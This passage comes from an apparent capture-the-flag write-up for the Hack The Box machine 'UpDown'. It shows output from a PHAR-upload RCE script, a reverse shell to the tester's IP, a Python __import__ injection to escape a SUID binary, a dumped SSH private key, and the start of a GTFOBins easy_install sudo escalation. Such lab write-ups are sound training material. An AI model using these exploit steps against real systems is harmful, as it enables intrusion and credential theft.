font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-8">       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">by</span> 0xPThree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> exploit.se </span>
<span id="cb14-9">       </span>
<span id="cb14-10"></span>
<span id="cb14-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> File uploaded to: http://dev.siteisup.htb/uploads/1e0087c3c8c5df2f1f97f1cd169b705f/05f6adf04d44.phar</span>
<span id="cb14-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Executing command <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'hostname &amp;&amp; id'</span>...</span>
<span id="cb14-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Response: updown</span>
<span id="cb14-14"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-15"></span>
<span id="cb14-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://exploit.se</span></span>
<span id="cb14-17"></span>
<span id="cb14-18"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">time</span> elapsed: 0.284085750579834 seconds</span></code></pre></div>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown python3 updown_rce.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span>                 </span>
<span id="cb15-2"></span>
<span id="cb15-3">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>   _       ____                      </span>
<span id="cb15-4"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> __ <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span> _____      ___ __  </span>
<span id="cb15-5"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_ \| | | |/ _ \ \ /\ / / '</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span></span>
<span id="cb15-6"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\ V</span>  V /<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb15-7">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\___/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.__/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">____/</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>__/ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>/\_/ <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb15-8">       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">by</span> 0xPThree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> exploit.se </span>
<span id="cb15-9">       </span>
<span id="cb15-10"></span>
<span id="cb15-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> File uploaded to: http://dev.siteisup.htb/uploads/102fe1680abe9017c824e82855db0674/71926ca1faf8.phar</span>
<span id="cb15-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Preparing reverse shell</span>
<span id="cb15-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Starting listener on port 4488</span>
<span id="cb15-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb15-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.14</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.129.4.182]</span> 41428</span>
<span id="cb15-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh:</span> 0: cant access tty<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">job</span> control turned off</span>
<span id="cb15-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb15-18"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">updown</span></span></code></pre></div>
<p>Full script is found <a href="../../assets/scripts/updown_rce.py">HERE</a>.</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>With a shell, the privilege escalation vector is quite obvious, we have <strong>SUID</strong> bit as <code>developer</code> on <code>siteisup</code> binary:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@updown:/home/developer/dev$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 32</span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-x---</span> 2 developer www-data   4096 Jun 22 15:45 .</span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 6 developer developer  4096 Aug 30 11:24 ..</span>
<span id="cb16-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwsr-x---</span> 1 developer www-data  16928 Jun 22 15:45 siteisup</span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-x---</span> 1 developer www-data    154 Jun 22 15:45 siteisup_test.py</span>
<span id="cb16-7"></span>
<span id="cb16-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@updown:/home/developer/dev$</span> file siteisup</span>
<span id="cb16-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">siteisup:</span> setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SYSV</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">sha1</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped</span></code></pre></div>
<p>We can assume that the code from <code>siteisup</code> is the same as the python script:</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@updown:/home/developer/dev$</span> cat siteisup_test.py</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">import</span> requests</span>
<span id="cb17-3"></span>
<span id="cb17-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">url</span> = input<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Enter URL here:"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb17-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">page</span> = requests.get<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb17-6"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">page.status_code</span> == 200:</span>
<span id="cb17-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">print</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Website is up"</span></span>
<span id="cb17-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">else:</span></span>
<span id="cb17-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">print</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Website is down"</span></span></code></pre></div>
<p><code>import()</code> is generally seen as a dangerous function, together with <code>eval()</code> and <code>exec()</code>, we can easily break out from the program and get a shell as <code>developer</code>:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@updown:/home/developer/dev$</span> ./siteisup</span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Welcome</span> to <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'siteisup.htb'</span> application</span>
<span id="cb18-3"></span>
<span id="cb18-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> URL here:__import__<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'os'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/bin/bash'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb18-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/home/developer/dev$</span> id</span>
<span id="cb18-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1002<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb18-7"></span>
<span id="cb18-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/home/developer$</span> cat user.txt</span>
<span id="cb18-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">107ab9b44d8853f426ebe841cdae9cbf</span></span>
<span id="cb18-10"></span>
<span id="cb18-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/home/developer/.ssh$</span> cat id_rsa</span>
<span id="cb18-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb18-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
<span id="cb18-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/</span></span>
<span id="cb18-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2</span></span>
<span id="cb18-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY</span></span>
<span id="cb18-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo</span></span>
<span id="cb18-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q</span></span>
<span id="cb18-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu</span></span>
<span id="cb18-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">u0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ck</span></span>
<span id="cb18-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2</span></span>
<span id="cb18-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EAAAGBAJrweNE1jPHrtJ+hTs4sUwNaUN/UqcGMq2Aoyqw7afIORNORBHCcP0taovTxaDb8</span></span>
<span id="cb18-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5Le1Mt/vusQ3feboAHbbkS+6swNN8UjZKp7dh4IygDzq+nLSLzA6YfCXgRdhfUsuF67Xwj</span></span>
<span id="cb18-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">++vlqc5sU+7rbxg9DdQGN/hBkaTm+6ufV9KXD0ZyFJ8btrDfryF43xr6ogGKMzgeQ3l/K2</span></span>
<span id="cb18-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9m5Ioukt0NbTNVVA6Fu3AkW5wTIJZthVxCVPZRL/T8tg+AWrxb6FKrU/GgqLK6yr06QEJD</span></span>
<span id="cb18-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6734qEobSKaPeRn8segY9jCiekLoYiSvjts2JtM9ro4wl7jN1eCW9CNVHfqmvkLcU7DUFa</span></span>
<span id="cb18-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">XCLnLdOsU31V3hLT04WiyOSpFxJcfk4MEdOt948EaX8dXlYCwscWJOQmqR7rtJ4VKSAlNR</span></span>
<span id="cb18-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">V6+rVdrhNSyG+UyawiMeO/RJW3NTD6xgpLEFVfBHrCO5JOQNkq5zTMS3tnJCLEB0B8SHIr</span></span>
<span id="cb18-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wgiMweEfRWzinUismUx3mc4z8J1PhQAAAAMBAAEAAAGAMhM4KP1ysRlpxhG/Q3kl1zaQXt</span></span>
<span id="cb18-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b/ilNpa+mjHykQo6+i5PHAipilCDih5CJFeUggr5L7f06egR4iLcebps5tzQw9IPtG2TF+</span></span>
<span id="cb18-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ydt1GUozEf0rtoJhx+eGkdiVWzYh5XNfKh4HZMzD/sso9mTRiATkglOPpNiom+hZo1ipE0</span></span>
<span id="cb18-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NBaoVC84pPezAtU4Z8wF51VLmM3Ooft9+T11j0qk4FgPFSxqt6WDRjJIkwTdKsMvzA5XhK</span></span>
<span id="cb18-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rXhMhWhIpMWRQ1vxzBKDa1C0+XEA4w+uUlWJXg/SKEAb5jkK2FsfMRyFcnYYq7XV2Okqa0</span></span>
<span id="cb18-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NnwFDHJ23nNE/piz14k8ss9xb3edhg1CJdzrMAd3aRwoL2h3Vq4TKnxQY6JrQ/3/QXd6Qv</span></span>
<span id="cb18-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ZVSxq4iINxYx/wKhpcl5yLD4BCb7cxfZLh8gHSjAu5+L01Ez7E8MPw+VU3QRG4/Y47g0cq</span></span>
<span id="cb18-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DHSERme/ArptmaqLXDCYrRMh1AP+EPfSEVfifh/ftEVhVAbv9LdzJkvUR69Kok5LIhAAAA</span></span>
<span id="cb18-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wCb5o0xFjJbF8PuSasQO7FSW+TIjKH9EV/5Uy7BRCpUngxw30L7altfJ6nLGb2a3ZIi66p</span></span>
<span id="cb18-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0QY/HBIGREw74gfivt4g+lpPjD23TTMwYuVkr56aoxUIGIX84d/HuDTZL9at5gxCvB3oz5</span></span>
<span id="cb18-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">VkKpZSWCnbuUVqnSFpHytRgjCx5f+inb++AzR4l2/ktrVl6fyiNAAiDs0aurHynsMNUjvO</span></span>
<span id="cb18-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N8WLHlBgS6IDcmEqhgXXbEmUTY53WdDhSbHZJo0PF2GRCnNQAAAMEAyuRjcawrbEZgEUXW</span></span>
<span id="cb18-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">z3vcoZFjdpU0j9NSGaOyhxMEiFNwmf9xZ96+7xOlcVYoDxelx49LbYDcUq6g2O324qAmRR</span></span>
<span id="cb18-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RtUPADO3MPlUfI0g8qxqWn1VSiQBlUFpw54GIcuSoD0BronWdjicUP0fzVecjkEQ0hp7gu</span></span>
<span id="cb18-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJ</span></span>
<span id="cb18-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB</span></span>
<span id="cb18-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aa</span></span>
<span id="cb18-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v</span></span>
<span id="cb18-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe</span></span>
<span id="cb18-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==</span></span>
<span id="cb18-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----</span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Running <code>sudo -l</code> shows us the privilege escalation vector:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/dev/shm$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span></span>
<span id="cb19-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Matching</span> Defaults entries for developer on localhost:</span>
<span id="cb19-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">env_reset,</span> mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
<span id="cb19-4"></span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">User</span> developer may run the following commands on localhost:</span>
<span id="cb19-6">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ALL</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NOPASSWD:</span> /usr/local/bin/easy_install</span></code></pre></div>
<p>Looking up <em>easy_install</em> on <a href="https://gtfobins.github.io/gtfobins/easy_install/">gtfobins</a> we get the syntax to instantly spawn a root shell.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/dev/shm$</span> TF=<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mktemp</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/dev/shm$</span> echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
